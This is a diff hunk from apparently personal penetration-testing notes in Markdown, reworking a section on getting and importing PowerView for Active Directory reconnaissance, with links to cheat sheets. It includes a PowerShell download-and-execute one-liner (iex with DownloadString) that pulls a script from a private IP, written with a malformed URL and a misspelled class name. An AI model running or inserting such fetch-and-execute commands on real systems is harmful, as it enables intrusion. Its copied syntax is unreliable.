@@ -88,20 +88,19 @@
 
 &nbsp;  
 
-## PowerView  
+## Get PowerView  
 
 1. New PowerView: [PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)  
 &nbsp;&nbsp;&nbsp;&nbsp;- *Download zip, or git clone, or copy/paste in `notepad.exe PowerView.ps1` or by `iwr -Uri "https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon/PowerView.ps1" -Outfile PowerView.ps1`*  
 &nbsp;&nbsp;&nbsp;&nbsp;- *Right way to download: `iex (New-Object New.WebClient).DownloadString("https:10.0.0.7/powersploit/PowerSploit-master/Recon/PowerView.ps1")`*  
 
-2. `Import-Module .\PowerView.ps1`
-&nbsp;&nbsp;&nbsp;&nbsp;- * PowerView Tips: [HarmJ0y/Cheatsheets](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf) and [BSidesCharm-PowershellSecurity](https://adsecurity.org/wp-content/uploads/2016/05/BSidesCharm-2016-PowerShellSecurity-Defending-the-Enterprise-from-the-Latest-Attack-Platform-FINAL.pdf)
+2. `Import-Module .\PowerView.ps1`  
 
 &nbsp;  
 
-## 
+## PowerView  
 
-1. 
+1. Using PowerView tips: [HarmJ0y/Cheatsheets](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf) and [BSidesCharm-PowershellSecurity](https://adsecurity.org/wp-content/uploads/2016/05/BSidesCharm-2016-PowerShellSecurity-Defending-the-Enterprise-from-the-Latest-Attack-Platform-FINAL.pdf)
 
 &nbsp;  
 
